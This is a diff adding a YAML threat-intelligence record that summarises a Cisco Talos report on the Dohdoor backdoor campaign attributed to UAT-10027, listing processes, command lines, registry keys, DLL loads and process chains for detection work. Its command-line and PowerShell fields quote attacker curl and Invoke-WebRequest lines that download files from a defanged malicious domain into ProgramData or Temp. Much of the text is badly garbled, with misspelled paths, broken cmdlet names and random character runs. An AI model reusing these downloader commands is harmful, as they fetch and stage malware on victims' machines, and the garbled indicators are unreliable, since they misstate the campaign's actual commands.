@@ -1,0 +1,54 @@
+description: Cisco Talos discovered an ongoing malicious campaign by UAT-10027 delivering
+  the Dohdoor backdoor, targeting education and health care sectors in the US.
+attribution: UAT-10027
+malware_families:
+- Dohdoor
+TTPs:
+  processes:
+  - curl.exe
+  - powershell.exe
+  - Fondue.exe
+  - mblctr.exe
+  - ScreenClippingHost.exe
+  - OpenWith.exe
+  - wksprt.exe
+  - ImagingDevices.exe
+  - wab.exe
+  commandline:
+  - curl -s -L YHDITyLNsWVuU[. IDEEPinSPeCT ioNsySTENL.]onLiNe[ /111111?sub=d -0Ci\\ProgranData\\sqaBUNSTfHpjufty >nul
+  - curl.exe retry 20 -LB AR TR 54K AT 2577 THEERG R K 2ERA XTI TR K AERT IX6F RAGKS X5 SHEOKA4HLCHEFRE 1564%2E%6AXEKSIHEINOTH E/X7BXIIXIINIIXILXIINI] 0 CITndrPunnA.cmd
+  powershell:
+  - Invoke-WebRequest -Uri $URL -OutFile outputFile
+  - Invoke-MebRequest ~Uri $Url -0utFile $destination1
+  - '$Url = "huxpl: /7 1LBaNDUZZCFGL . ] deepInspect iOnSYSTEMT . JoRLINE/X112111"'
+  - $Destination = "C:\\Tenp\\sanple. exe"
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\SoFtuare\\Wicrosof t\\Windons\\CurrentVersion\\Explorer\\RunMRU
+  image_load:
+  - propsys.dll
+  - batmeter.dll
+  - mblctr.exe
+  - ScreenClippingHost.exe
+  - OpenWith.exe
+  - wksprt.exe
+  - ImagingDevices.exe
+  - wab.exe
+  network_connections:
+  - curl.exe, cloudflare-dns.com, 443
+  - powershell.exe, cloudflare-dns.com, 443
+  file_activity:
+  - C:\\ProgramData\\sqaBUNSTfHpjufty >aul 2561
+  - C:\\ProgranData\\sqaBUHSTfHpjuftyN / start " mbletr.exe YHDITYLNsMVUUL. IDEEPinSPeCT
+    ioNsySTENL.]onLiNe[ /111111?sub=sdel /f /g xeFe
+  persistence: []
+  process_relations:
+  - powershell.exe -> curl.exe
+  - curl.exe -> Fondue.exe
+  - Fondue.exe -> Dohdoor
+IOCs:
+  hashes: []
+  ip_addresses: []
+reference: https://blog.talosintelligence.com/new-dohdoor-malware-campaign/
+date_of_publication: February 26, 2026
+file_creation_date: February 28, 2026
